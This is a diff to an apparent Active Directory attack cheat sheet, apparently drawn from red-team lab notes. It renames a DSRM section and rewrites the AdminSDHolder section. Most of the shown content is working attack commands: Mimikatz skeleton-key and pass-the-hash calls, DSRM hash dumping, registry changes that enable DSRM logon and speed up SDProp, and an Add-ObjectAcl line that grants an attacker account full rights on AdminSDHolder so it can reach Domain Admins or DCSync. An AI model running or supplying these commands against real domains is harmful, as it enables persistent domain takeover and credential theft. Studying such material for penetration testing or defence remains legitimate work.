@@ -31,6 +31,7 @@ Last update: **12 Oct 2022**
   -  [Golden Ticket](#golden-ticket)
   -  [Silver Ticket](#silver-ticket)
   -  [Skeleton Key](#skeleton-key)
+  -  [Directory Services Restore Mode (DSRM)](#Directory-Services-Restore-Mode-(DSRM))
   -  [DCSync](#dcsync)
 - [Privilege Escalation](#privilege-escalation)
   -  [Kerberoast](#kerberoast)
@@ -561,7 +562,7 @@ schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local "STCheck"
 Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'-ComputerName dcorp-dc.corporate.corp.local
 ```
 
-### DSRM Directory Services Restore Mode
+### Directory Services Restore Mode (DSRM)
 
 - **Invoke-Mimikatz:**
 ```powershell
@@ -576,16 +577,16 @@ Invoke-Mimikatz -Command '"privilege::debug" “sekurlsa::pth" /domain:dcorp-dc 
 ```
 
 ### AdminSDHolder
-- **Invoke-Mimikatz:**
+- **Idea is to Abuse the object AdminSDHolder and change its ACL to affect ACL of protected groups (Domain admins and similar)**
 ```powershell
-# Command to get DSRM hash (administrator) (it is different from the hash with "lsadmp::lsa /patch")
-Invoke-Mimikatz -Command '"privilege::debug" "lsadump::sam"' -ComputerName dcorp-dc.corporate.corp.local
-# Once got the hash of DSRM it's possible to use it for pass the hash
-# But before a change to registry is needed (it shouldn't exist by default)
-# HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior = 2 (DWORD)
-New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD
-# Then run powershell on domain controller
-Invoke-Mimikatz -Command '"privilege::debug" “sekurlsa::pth" /domain:dcorp-dc /user:Administrator /ntlm:hash /run:powershell.exe"'
+# Command to give to attacker user full privilege to AdminSDHolder
+Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName attacker -Verbose -Rights All
+# in about 60 minutes  this ACL is propageted to domain admin groups and other privileged groups
+# It also can be forced in a few ways
+# modifying the registry 
+REG ADD HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG_DWORD /F /D 300 
+# or using a script InvokeSDPropagator
+# After that, the user attacker can add members to "domain admins" group or can add DCSync rights and execute a DCSync 
 ```
 
 
